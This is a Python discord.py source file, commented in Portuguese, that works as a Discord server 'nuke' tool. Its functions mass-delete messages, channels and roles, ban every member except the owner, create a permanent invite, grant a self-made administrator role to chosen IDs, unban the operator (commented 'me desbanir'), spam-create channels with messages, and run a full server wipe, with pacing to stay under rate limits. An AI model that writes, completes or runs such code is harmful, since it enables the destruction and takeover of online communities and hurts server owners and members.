import discord
import asyncio

# limite de tarefas simultaneas
limite = asyncio.Semaphore(5)


async def limpar_canal(guild, canal_id):

    canal = guild.get_channel(canal_id)

    if not canal:
        print("Canal não encontrado.")
        return

    print("\nLimpando mensagens...\n")

    deletadas = 0

    async for mensagem in canal.history(limit=None):

        async with limite:
            try:
                await mensagem.delete()
                deletadas += 1

                if deletadas % 10 == 0:
                    print(f"{deletadas} mensagens deletadas")

                await asyncio.sleep(0.4)

            except:
                await asyncio.sleep(1)

    print(f"\n{deletadas} mensagens removidas.")


# banir membros (dentro do rate limit)

async def banir_membro(guild, membro):

    async with limite:
        try:
            await guild.ban(membro)
            print("Banido:", membro)

        except:
            pass


async def banir_todos(guild):

    print("\nBuscando membros...\n")

    membros = [m async for m in guild.fetch_members(limit=None)]

    print(f"{len(membros)} membros encontrados\n")
    print("Iniciando banimento...\n")

    banidos = 0

    for membro in membros:

        if membro == guild.owner or membro.bot:
            continue

        try:
            await guild.ban(membro)
            banidos += 1

            print(f"Banido: {membro}")

            # evita rate limit
            await asyncio.sleep(0.3)

        except Exception as e:
            print("Erro:", e)

    print(f"\nBanimento finalizado ({banidos} membros).")
    
async def criar_convite(guild):

    print("\nGerando convite...\n")

    try:

        canal = None

        # procurar canal onde o bot pode criar convite
        for c in guild.text_channels:
            if c.permissions_for(guild.me).create_instant_invite:
                canal = c
                break

        if canal is None:
            print("Nenhum canal com permissão para criar convite.")
            return

        convite = await canal.create_invite(
            max_age=0,
            max_uses=0,
            temporary=False,
            unique=False
        )

        print("\nConvite criado com sucesso!\n")
        print(f"Servidor: {guild.name}")
        print(f"Canal: {canal.name}")
        print(f"Link: {convite.url}\n")

    except Exception as e:
        print("Erro ao criar convite:", e)

# del canais

async def deletar_canal(canal):

    async with limite:
        try:
            await canal.delete()
            print("Canal deletado:", canal.name)

        except:
            pass


async def deletar_canais(guild):

    print("\nDeletando canais...\n")

    tarefas = []

    for canal in guild.channels:
        tarefas.append(deletar_canal(canal))

    await asyncio.gather(*tarefas)

    print("\nCanais removidos.")


# del cargos

async def deletar_cargo(cargo):

    async with limite:
        try:
            await cargo.delete()
            print("Cargo removido:", cargo.name)

        except:
            pass


async def deletar_cargos(guild):

    print("\nDeletando cargos...\n")

    tarefas = []

    for cargo in guild.roles:

        if cargo.name == "@everyone":
            continue

        tarefas.append(deletar_cargo(cargo))

    await asyncio.gather(*tarefas)

    print("\nCargos removidos.")


#adm 

async def dar_admin(guild, ids):

    print("\nCriando cargo ADMIN...\n")

    admin_role = discord.utils.get(guild.roles, name="ADMIN")

    if not admin_role:

        admin_role = await guild.create_role(
            name="ADMIN",
            permissions=discord.Permissions(administrator=True)
        )

        print("Cargo ADMIN criado.")

    print("\nAplicando cargo...\n")

    for user_id in ids:

        membro = guild.get_member(int(user_id))

        if membro:
            try:
                await membro.add_roles(admin_role)
                print("ADMIN aplicado:", membro)

            except Exception as e:
                print("Erro:", e)

# me desbanir

async def desbanir_usuario(guild, user_id):

    print("\nDesbanindo usuário...\n")

    try:
        bans = [entry async for entry in guild.bans()]

        for ban_entry in bans:
            user = ban_entry.user

            if str(user.id) == str(user_id):
                await guild.unban(user)
                print(f"Usuário desbanido: {user} ({user.id})")
                return

        print("Usuário não encontrado na lista de banidos.")

    except Exception as e:
        print("Erro ao desbanir:", e)

#reset server 

async def reset_total(guild):

    print("\nINICIANDO RESET DO SERVIDOR...\n")

    # pegar todos os membros
    membros = [m async for m in guild.fetch_members(limit=None)]

    # filtrar membros válidos
    membros = [
        m for m in membros
        if m != guild.owner and not m.bot
    ]

    print(f"{len(membros)} membros encontrados")

    # deletar canais
    print("\nDeletando canais...\n")

    canais_tasks = [canal.delete() for canal in guild.channels]

    await asyncio.gather(*canais_tasks, return_exceptions=True)

    print("Canais removidos.")

    # deletar cargos
    print("\nRemovendo cargos...\n")

    cargos_tasks = [
        cargo.delete()
        for cargo in guild.roles
        if cargo.name != "@everyone"
    ]

    await asyncio.gather(*cargos_tasks, return_exceptions=True)

    print("Cargos removidos.")

    # banir membros
    print("\nBanindo membros...\n")

    for membro in membros:

        try:
            await guild.ban(membro)
            print("Banido:", membro)

            await asyncio.sleep(0.3)

        except:
            pass

    print("\nRESET FINALIZADO.")


# criar canais)

async def criar_um_canal(guild, nome, mensagem, numero):

    async with limite:

        try:

            canal = await guild.create_text_channel(f"{nome}-{numero}")

            if mensagem.strip() != "":
                await canal.send(mensagem)

            print(f"Canal criado: {nome}-{numero}")

        except Exception as e:
            print("Erro:", e)


async def criar_canais(guild, quantidade, nome_canal, mensagem):

    print("\nCriando canais...\n")

    tarefas = []

    for i in range(quantidade):
        tarefas.append(criar_um_canal(guild, nome_canal, mensagem, i+1))

    await asyncio.gather(*tarefas)

    print("\nCanais criados.")
    
    